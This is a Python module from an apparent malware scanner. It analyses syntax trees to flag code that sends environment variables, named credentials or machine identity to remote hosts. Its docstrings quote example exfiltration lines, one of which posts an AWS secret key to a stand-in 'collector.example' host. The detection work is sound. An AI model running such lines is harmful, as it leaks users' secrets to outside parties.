"""What a Python file sends: the whole environment or one named credential to another machine, the
machine's identity, values read from local files, and the environment a child process inherits.
"""

from __future__ import annotations

import ast
from typing import TYPE_CHECKING

from cordon_scanner.analysis.python.pyfacts import (
    DNS_LOOKUPS,
    ENVIRONMENT,
    PRIMITIVES,
    PythonFacts,
)
from cordon_scanner.analysis.python.pysyntax import PythonSyntax
from cordon_scanner.foundation.capabilities import Capability

if TYPE_CHECKING:
    from collections.abc import Callable


from cordon_scanner.analysis.python.analyzer_core import AnalyzerCore


class DataFlows(AnalyzerCore):
    """The Python analyser's data flows: what a file reads and sends."""

    def _environment_handed_to_children(self, tree: ast.AST) -> frozenset[int]:
        """`os.environ` nodes whose whole-environment copy only ever becomes a child's environment.

        `env = os.environ.copy(); env.update(extra); subprocess.call(cmd, env=env)` -- nodeenv,
        and every build script that sets one variable for a compiler. The copy is the parent's
        environment handed to its own child, which inherits it anyway; nothing is read out of
        it. Accepted holders: `X = os.environ.copy()`, `X = dict(os.environ, ...)`,
        `X = {**os.environ, ...}`, `X.update(os.environ)`, or the read written straight into
        `env=`. Every other use of the holder -- serialised, sent, iterated, returned -- keeps
        the read a whole-environment read.
        """
        # Kept on the tree: three passes ask, and the answer depends only on the tree and its
        # name tables, which are complete before any of them runs.
        kept: frozenset[int] | None = tree.__dict__.get("_cordon_handed")
        if kept is not None:
            return kept
        # Keyed by (enclosing function, name): `env` is the usual name, and one function's
        # hand-off says nothing about what another function does with its own `env`.
        environ_nodes: dict[tuple[int, str], list[int]] = {}
        direct: set[int] = set()
        parents = PythonSyntax.parents(tree)

        def scope_of(node: ast.AST) -> ast.AST:
            current = parents.get(id(node))
            while current is not None and not isinstance(
                current, ast.FunctionDef | ast.AsyncFunctionDef | ast.Lambda
            ):
                current = parents.get(id(current))
            return current if current is not None else tree

        def is_environ(node: ast.AST) -> bool:
            return self._dotted(node) in ENVIRONMENT

        # Only the node types `_dotted` can name; every other node is not `os.environ`.
        for node in PythonSyntax.of(tree, ast.Name, ast.Attribute, ast.Call):
            if not is_environ(node):
                continue
            parent = parents.get(id(node))
            copy: ast.AST | None = None
            if isinstance(parent, ast.Attribute) and parent.attr == "copy":
                call = parents.get(id(parent))
                copy = call if isinstance(call, ast.Call) and call.func is parent else None
            elif (
                isinstance(parent, ast.Call)
                and isinstance(parent.func, ast.Name)
                and parent.func.id == "dict"
                and parent.args
                and parent.args[0] is node
            ) or (isinstance(parent, ast.Dict) and None in parent.keys):
                copy = parent
            elif (
                isinstance(parent, ast.Call)
                and isinstance(parent.func, ast.Attribute)
                and parent.func.attr == "update"
                and isinstance(parent.func.value, ast.Name)
            ):
                environ_nodes.setdefault((id(scope_of(node)), parent.func.value.id), []).append(
                    id(node)
                )
                continue
            elif isinstance(parent, ast.keyword) and parent.arg == "env":
                direct.add(id(node))
                continue
            if copy is None:
                continue
            holder = parents.get(id(copy))
            if isinstance(holder, ast.keyword) and holder.arg == "env":
                direct.add(id(node))
            elif (
                isinstance(holder, ast.Assign)
                and len(holder.targets) == 1
                and isinstance(holder.targets[0], ast.Name)
            ):
                environ_nodes.setdefault((id(scope_of(node)), holder.targets[0].id), []).append(
                    id(node)
                )

        excused = set(direct)
        for (scope, name), nodes in environ_nodes.items():
            uses = [
                n
                for n in PythonSyntax.of(tree, ast.Name)
                if n.id == name and isinstance(n.ctx, ast.Load) and id(scope_of(n)) == scope
            ]
            if uses and all(self._harmless_use(use, parents) for use in uses):
                excused.update(nodes)
        result = frozenset(excused)
        tree.__dict__["_cordon_handed"] = result
        return result

    def _harmless_use(self, use: ast.Name, parents: dict[int, ast.AST]) -> bool:
        parent = parents.get(id(use))
        if isinstance(parent, ast.keyword) and parent.arg == "env":
            return True
        if isinstance(parent, ast.Attribute) and parent.value is use:
            return parent.attr in {"update", "setdefault", "pop", "get", "copy", "__setitem__"}
        if isinstance(parent, ast.Subscript) and parent.value is use:
            return True
        if isinstance(parent, ast.Assign) and parent.value is use:
            return all(
                isinstance(t, ast.Subscript) and PythonFacts.constant(t.slice) == "env"
                for t in parent.targets
            )
        if isinstance(parent, ast.Dict):
            index = next((i for i, v in enumerate(parent.values) if v is use), None)
            key = parent.keys[index] if index is not None else None
            return key is not None and PythonFacts.constant(key) == "env"
        return False

    def _iterated_literals(self, tree: ast.AST) -> dict[str, list[str]]:
        """Loop variables whose every value is a string literal, with those values.

        From `for n in (...)` and comprehensions, iterating either a literal tuple or list, or a
        name bound once to one. A name used as a loop variable twice, over different things, is
        left out rather than guessed at."""
        sequences: dict[str, list[str]] = {}
        assigned: dict[str, int] = {}
        for node in PythonSyntax.of(tree, ast.Assign):
            for target in node.targets:
                if isinstance(target, ast.Name):
                    assigned[target.id] = assigned.get(target.id, 0) + 1
                    values = PythonFacts.literal_strings(node.value)
                    if values is not None:
                        sequences[target.id] = values

        def resolved(iterable: ast.AST) -> list[str] | None:
            values = PythonFacts.literal_strings(iterable)
            if values is None and isinstance(iterable, ast.Name) and assigned.get(iterable.id) == 1:
                values = sequences.get(iterable.id)
            return values

        found: dict[str, list[str]] = {}
        refused: set[str] = set()
        for node in PythonSyntax.of(tree, ast.For, ast.comprehension):
            if isinstance(node.target, ast.Name):
                name = node.target.id
                values = resolved(node.iter)
                if values is None or (name in found and found[name] != values):
                    refused.add(name)
                else:
                    found[name] = values
        return {name: values for name, values in found.items() if name not in refused}

    def _handed_to_a_sender(
        self, tree: ast.AST, holds: Callable[..., bool]
    ) -> list[tuple[ast.Call, str]]:
        """Calls that hand what `holds` finds to a function of this file whose parameter reaches a
        request: `send(gather())` where `def send(data): requests.post(URL, data=json.dumps(data))`.

        The other half of `_carried`: a collector and a sender written as two functions, joined
        at the call (review 98, MalSkillBench). A lookup of the parameter itself
        (`def resolve(name): return socket.gethostbyname(name)`) is not a sender -- that is how
        a machine's own name is resolved; a name BUILT from it, as DNS exfiltration does, is.
        """
        senders: dict[str, tuple[list[str], set[str]]] = {}
        for function in PythonSyntax.of(tree, ast.FunctionDef, ast.AsyncFunctionDef):
            arguments = function.args
            params = [a.arg for a in (*arguments.posonlyargs, *arguments.args)]
            params += [a.arg for a in arguments.kwonlyargs]
            reaching: dict[str, set[str]] = {name: {name} for name in params}
            for _ in range(2):
                for assign in PythonSyntax.within(function, ast.Assign):
                    found = {
                        param
                        for part in PythonSyntax.within(assign.value, ast.Name)
                        for param in reaching.get(part.id, ())
                    }
                    for target in assign.targets:
                        if found and isinstance(target, ast.Name):
                            reaching.setdefault(target.id, set()).update(found)
            sent: set[str] = set()
            for call in PythonSyntax.within(function, ast.Call):
                resolved = self._resolve_callee(call)
                if resolved is None or PRIMITIVES.get(resolved[0]) is not Capability.EGRESS:
                    continue
                values = [*call.args, *(k.value for k in call.keywords)]
                if resolved[0] in DNS_LOOKUPS and values and isinstance(values[0], ast.Name):
                    values = values[1:]
                sent.update(
                    param
                    for value in values
                    for part in PythonSyntax.within(value, ast.Name)
                    for param in reaching.get(part.id, ())
                )
            if sent:
                senders[function.name] = (params, sent)

        sends: list[tuple[ast.Call, str]] = []
        if not senders:
            return sends
        for call in PythonSyntax.of(tree, ast.Call):
            func = call.func
            name = (
                func.id
                if isinstance(func, ast.Name)
                else func.attr
                if isinstance(func, ast.Attribute) and isinstance(func.value, ast.Name)
                else None
            )
            if name not in senders:
                continue
            params, sent = senders[name]
            # A method called on an instance or a class: its first parameter is that object.
            offset = (
                1 if isinstance(func, ast.Attribute) and params[:1] in (["self"], ["cls"]) else 0
            )
            handed = [
                (params[index + offset], value)
                for index, value in enumerate(call.args)
                if index + offset < len(params)
            ] + [(k.arg, k.value) for k in call.keywords if k.arg]
            if any(param in sent and holds(value) for param, value in handed):
                sends.append((call, name))
        return sends

    def _identity_sent(self, tree: ast.AST) -> None:
        """The machine's identity, in the arguments of a request.

        `requests.post(URL, json={"user": getpass.getuser(), "host": socket.gethostname()})`, or
        the same through a variable. Reading a hostname and making a request somewhere in the same
        thirty lines is what a telemetry plugin, a socket demo and a browser installer all do;
        putting the hostname in the request is the probe.
        """
        holds = PythonFacts.carried(tree, self._is_recon_call, ast.Subscript)
        for node in PythonSyntax.of(tree, ast.Call):
            resolved = self._resolve_callee(node)
            if resolved is None or PRIMITIVES.get(resolved[0]) is not Capability.EGRESS:
                continue
            arguments = [*node.args, *(k.value for k in node.keywords)]
            if resolved[0] in DNS_LOOKUPS and all(holds(a, deep=False) for a in node.args[:1]):
                # Looking up this machine's own name sends it to a resolver, not to anyone
                # who collects it; a name built into another domain is what DNS exfiltration is.
                continue
            if any(holds(argument) for argument in arguments):
                self._record(Capability.RECONNAISSANCE, node, f"identity sent: {resolved[0]}")
        for node, function in self._handed_to_a_sender(tree, holds):
            self._record(Capability.RECONNAISSANCE, node, f"identity sent: through {function}")

    def _environment_sent(self, tree: ast.AST) -> None:
        """The whole environment, in the arguments of a request.

        `urlopen(URL, json.dumps(dict(os.environ)).encode())`, or the same through a variable:
        every token and secret the process can see, serialised and sent in one call. Reading one
        named setting and calling its service is what every API client does; sending all of them
        is the commonest exfiltration in published malware. A keyed read (`os.environ["KEY"]`,
        `os.getenv("KEY")`) is not the whole environment, nor is a copy handed to a child
        process, which inherits it anyway.
        """
        parents = PythonSyntax.parents(tree)
        handed_on = self._environment_handed_to_children(tree)

        def is_whole(node: ast.AST) -> bool:
            if self._dotted(node) not in ("os.environ", "os.environb") or id(node) in handed_on:
                return False
            parent = parents.get(id(node))
            if isinstance(parent, ast.Subscript) and parent.value is node:
                return False
            if isinstance(parent, ast.Compare):
                return False
            # `os.environ.get("KEY")` and its kin read one named setting.
            return not (
                isinstance(parent, ast.Attribute)
                and parent.attr in ("get", "setdefault", "pop", "__contains__")
            )

        holds = PythonFacts.carried(tree, is_whole, ast.Attribute)
        for node in PythonSyntax.of(tree, ast.Call):
            resolved = self._resolve_callee(node)
            if resolved is None or PRIMITIVES.get(resolved[0]) is not Capability.EGRESS:
                continue
            arguments = [*node.args, *(k.value for k in node.keywords)]
            if any(holds(argument) for argument in arguments):
                self._record(Capability.CREDENTIAL, node, f"environment sent: {resolved[0]}")
        for node, function in self._handed_to_a_sender(tree, holds):
            self._record(Capability.CREDENTIAL, node, f"environment sent: through {function}")

    def _secret_sent(self, tree: ast.AST) -> None:
        """One named credential, in a request to a host outside the credential's home.

        `urlopen("https://collector.example/?k=" + os.environ["AWS_SECRET_ACCESS_KEY"])`, or the
        value through a variable, or the URL through one. See `analysis/shared/credential_homes.py` for what a
        home is and why a host the file does not write down is never judged.
        """
        from cordon_scanner.analysis.shared.credential_homes import SecretFlow

        carrying: dict[str, str] = {}
        urls: dict[str, str] = {}
        for _ in range(3):
            for node in PythonSyntax.of(tree, ast.Assign):
                targets = [t.id for t in node.targets if isinstance(t, ast.Name)]
                literal = PythonFacts.url_literal(node.value)
                if literal is not None:
                    assigned = SecretFlow.host_of(literal)
                    if assigned:
                        urls.update(dict.fromkeys(targets, assigned))
                for part in PythonSyntax.nodes(node.value):
                    key = self._credential_read(part)
                    if key is None and isinstance(part, ast.Name) and part.id in carrying:
                        key = carrying[part.id]
                    if key is not None:
                        carrying.update(dict.fromkeys(targets, key))
                        break
        for node in PythonSyntax.of(tree, ast.Call):
            resolved = self._resolve_callee(node)
            if resolved is None or PRIMITIVES.get(resolved[0]) is not Capability.EGRESS:
                continue
            arguments = [*node.args, *(k.value for k in node.keywords)]
            keys: set[str] = set()
            for argument in arguments:
                for part in PythonSyntax.within(argument, ast.Subscript, ast.Call, ast.Name):
                    key = self._credential_read(part)
                    if key is None and isinstance(part, ast.Name) and part.id in carrying:
                        key = carrying[part.id]
                    if key is not None:
                        keys.add(key)
            if not keys:
                continue
            destination = (
                node.args[0]
                if node.args
                else next(
                    (k.value for k in node.keywords if k.arg in ("url", "uri", "host", "address")),
                    None,
                )
            )
            host: str | None = None
            if destination is not None:
                literal = PythonFacts.url_literal(destination)
                if literal is not None:
                    host = SecretFlow.host_of(literal)
                elif isinstance(destination, ast.Name):
                    host = urls.get(destination.id)
            for key in sorted(keys):
                if SecretFlow.misdirected(key, host):
                    self._record(Capability.CREDENTIAL, node, f"secret sent: {key} to {host}")
                    break

    def _credential_read(self, node: ast.AST) -> str | None:
        from cordon_scanner.analysis.shared.credential_homes import SecretFlow

        name: ast.AST | None = None
        if isinstance(node, ast.Subscript) and self._dotted(node.value) in (
            "os.environ",
            "os.environb",
        ):
            name = node.slice
        elif isinstance(node, ast.Call):
            dotted = self._dotted(node.func)
            if (
                dotted in ("os.getenv", "os.environ.get", "os.environ.setdefault", "os.environ.pop")
                and node.args
            ):
                name = node.args[0]
        if isinstance(name, ast.Constant) and isinstance(name.value, str):
            return name.value if SecretFlow.home_of(name.value) else None
        return None

    def _read_from_local_file(self, node: ast.AST) -> bool:
        """Whether every name in this expression holds text read from a local file, rather than
        from anywhere that could be remote."""
        names = [n.id for n in PythonSyntax.within(node, ast.Name)]
        return bool(names) and all(name in self._local_reads for name in names)

    def _loads_a_bundled_file(self, node: ast.Call, dotted: str) -> bool:
        """`torch.load(os.path.join(os.path.dirname(__file__), "model.pt"), weights_only=False)`:
        a pickle shipped beside the module, deserialised -- which runs whatever the pickle names.

        `torch.load` counts only with `weights_only=False` written out, the switch that turns its
        safe loader off. The pickle-family loaders have no safe mode, so for them a path built from
        `__file__` is enough. A path from anywhere else is a user's own file, which is what these
        loaders are for."""
        if dotted == "torch.load":
            unsafe = any(
                k.arg == "weights_only"
                and isinstance(k.value, ast.Constant)
                and k.value.value is False
                for k in node.keywords
            )
            if not unsafe:
                return False
        argument = node.args[0] if node.args else None
        if argument is None:
            return False
        if isinstance(argument, ast.Call) and self._dotted(argument.func) == "open":
            argument = argument.args[0] if argument.args else argument
        names = {n.id for n in PythonSyntax.within(argument, ast.Name)}
        if isinstance(argument, ast.Name) and argument.id in self._bundled_paths:
            return True
        return "__file__" in names

    def _keyed_environment_reads(self, tree: ast.AST) -> dict[int, str]:
        """Environment nodes that are read with one literal key, and that key.

        The judgement has to be made at the PARENT: `os.environ` and
        `os.environ["PATH"]` contain the same `Attribute` node, so the bare-name
        branch of the walk cannot tell a whole-environment read from a single
        setting without looking up. A node absent from this map was either used
        as a whole mapping -- passed somewhere, copied, iterated, unpacked -- or
        subscripted with something computed, and both of those are the broad
        access.
        """
        keyed: dict[int, str] = {}
        written: set[int] = set()
        for node in PythonSyntax.of(tree, ast.Assign):
            for target in node.targets:
                if isinstance(target, ast.Subscript) and self._dotted(target.value) in ENVIRONMENT:
                    # `os.environ["X"] = "1"` SETS a variable. Reading the
                    # environment is what this primitive is about, and a Google
                    # Workspace setup script in `NousResearch/hermes-agent` was
                    # reported for exfiltration on the strength of
                    # `os.environ["OAUTHLIB_RELAX_TOKEN_SCOPE"] = "1"`.
                    written.add(id(target.value))

        candidates = self._iterated_literals(tree)
        for node_id in self._environment_handed_to_children(tree):
            keyed[node_id] = ""

        for node in PythonSyntax.of(tree, ast.Subscript, ast.Call, ast.Compare):
            if isinstance(node, ast.Subscript):
                # `os.environ["NAME"]`
                key = self._key_of(node.slice, candidates)
                if key is not None and self._dotted(node.value) in ENVIRONMENT:
                    keyed[id(node.value)] = key
            elif isinstance(node, ast.Call):
                key = self._key_of(node.args[0], candidates) if node.args else None
                if key is None:
                    continue
                if self._dotted(node.func) in ENVIRONMENT:
                    # `os.getenv("NAME")`. Mapped against the function node,
                    # because the walk reaches that as a bare `Attribute` too and
                    # would record it whatever `_call` decided.
                    keyed[id(node.func)] = key
                elif (
                    isinstance(node.func, ast.Attribute)
                    and node.func.attr in {"get", "setdefault", "pop"}
                    and self._dotted(node.func.value) in ENVIRONMENT
                ):
                    # `os.environ.get("NAME")`, and the two methods that read the
                    # same way.
                    keyed[id(node.func.value)] = key
            elif isinstance(node, ast.Compare):
                # `"NAME" in os.environ` asks whether one setting is present and
                # obtains no value at all, so it is a weaker act than any of the
                # keyed reads above. It reached none of them: a `Compare` names no
                # key, registered nothing, and so the bare-`Attribute` branch of
                # the walk saw an unkeyed `os.environ` and called it
                # whole-environment access -- the broadest reading available, for
                # the narrowest act there is.
                #
                # `saltstack/salt` writes `if "WRITE_SALT_VERSION" in os.environ`
                # three times in its `setup.py` and `if "SALT_VERSION" in
                # os.environ` in `salt/version.py`. Both files are install-time by
                # definition and both reach the network, so both were
                # `MALWARE.EXFIL.001` at CRITICAL -- "reads credentials and
                # transmits them" -- for build flags that gate a version string.
                #
                # Judged by the name, like every other keyed read, rather than by
                # a second rule of its own. A presence test on a name that reads
                # as a credential is still worth the label, because code that asks
                # whether a token is set is code that means to use it, and the
                # read itself is its own hit wherever it happens.
                left: ast.expr = node.left
                for op, comparator in zip(node.ops, node.comparators, strict=True):
                    if isinstance(op, ast.In | ast.NotIn) and (
                        self._dotted(comparator) in ENVIRONMENT
                    ):
                        key = PythonFacts.constant(left)
                        if key is not None:
                            keyed[id(comparator)] = key
                    left = comparator
        for node_id in written:
            # A written name is not a read at all, whatever the name says.
            keyed[node_id] = ""
        return keyed

    def _key_of(self, node: ast.AST, candidates: dict[str, list[str]]) -> str | None:
        # A literal, or a loop variable drawn from a literal sequence of names --
        # `for n in ("http_proxy", "HTTPS_PROXY"): os.environ[n]`, which is how nodeenv
        # passes proxy settings on. Every candidate is judged, joined, so one name that
        # reads as a credential keeps the read a credential read.
        key = PythonFacts.constant(node)
        if key is None and isinstance(node, ast.Name) and node.id in candidates:
            return " ".join(candidates[node.id])
        return key


__all__ = ["DataFlows"]
